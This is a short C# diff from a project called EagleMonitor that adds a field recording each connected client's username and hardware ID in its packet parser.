@@ -47,6 +47,7 @@ namespace EagleMonitor.PacketParser
                 }
 
                 clientHandler.clientPath = Miscellaneous.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID;
+                clientHandler.fullName = connectedPacket.Username + "@" + connectedPacket.HWID;
 
                 Program.mainForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                 {
